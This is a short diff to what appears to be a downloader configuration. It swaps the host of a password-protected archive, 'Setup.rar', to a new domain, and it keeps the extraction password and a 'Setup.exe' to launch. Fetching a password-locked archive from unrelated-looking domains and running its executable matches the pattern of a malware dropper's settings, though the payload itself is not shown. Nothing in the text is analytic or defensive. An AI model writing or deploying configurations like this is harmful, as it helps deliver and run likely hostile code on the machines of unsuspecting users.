@@ -1,4 +1,4 @@
-url=https://healtylifestyleforus.com/Setup.rar
+url=https://test.growwithcoins.com/Setup.rar
 name=Setup.rar
 password=2025
 setup=Setup.exe
